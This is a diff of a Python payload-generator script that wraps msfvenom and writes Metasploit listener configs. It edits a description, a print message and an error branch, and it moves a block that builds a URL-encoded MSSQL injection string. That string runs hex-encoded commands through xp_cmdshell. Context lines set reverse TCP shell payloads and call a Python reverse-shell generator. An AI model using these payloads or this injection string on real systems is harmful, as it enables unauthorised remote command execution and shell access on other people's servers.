@@ -12,7 +12,7 @@
 # 14/06/2018                                                                                                #
 #                                                                                                           #
 # DESCRIPTION                                                                                               #
-#  Managed various payloads and listeners                                                                   #
+#  Just a wrapper around msvenom to simplify payload creation                                               #
 #                                                                                                           #
 # nighter - nighter@nighter.se                                                                              #
 #                                                                                                           #
@@ -228,7 +228,7 @@ def msfvenom(type, lhost, lport):
         print("[+] %s" % command)
 
     os.system(command)
-    print("[+] Saved: %s" % str(command).split('/')[-1])
+    print("[+] Saved %s_payload" % type)
 
     if type == 'mperl64' or type == 'mperl32':
         create_perl_mem_payload(type)
@@ -263,7 +263,7 @@ def listener(type, lhost, lport):
     elif type == 'lin32ts':
         payload += "set PAYLOAD linux/x86/shell/reverse_tcp\n"
     else:
-        print_usage()
+        pass
 
     payload += "set LHOST %s\n" % lhost
     payload += "set LPORT %s\n" % lport
@@ -664,6 +664,14 @@ if __name__ == '__main__':
     lhost = sys.argv[2]
     lport = sys.argv[3]
 
+    if type == 'xpcmdi':
+        _command = "0x%s" % binascii.hexlify(lport)
+        data = "';DECLARE @bzfp VARCHAR(8000);SET @bzfp=%s;EXEC master..xp_cmdshell @bzfp--" % _command
+        print('')
+        print(ul.quote_plus(data).replace('+', '%20'))
+        print('')
+        sys.exit(0)
+
     try:
         socket.inet_aton(lhost)
     except socket.error:
@@ -673,14 +681,6 @@ if __name__ == '__main__':
         except:
             print('[-] No such interface: %s' % lhost)
             sys.exit(1)
-
-    if type == 'xpcmdi':
-        _command = "0x%s" % binascii.hexlify(lport)
-        data = "';DECLARE @bzfp VARCHAR(8000);SET @bzfp=%s;EXEC master..xp_cmdshell @bzfp--" % _command
-        print('')
-        print(ul.quote_plus(data).replace('+', '%20'))
-        print('')
-        sys.exit(0)
 
     if type == 'b64py':
         print(python_reverse_shell(lhost, lport, ver=''))
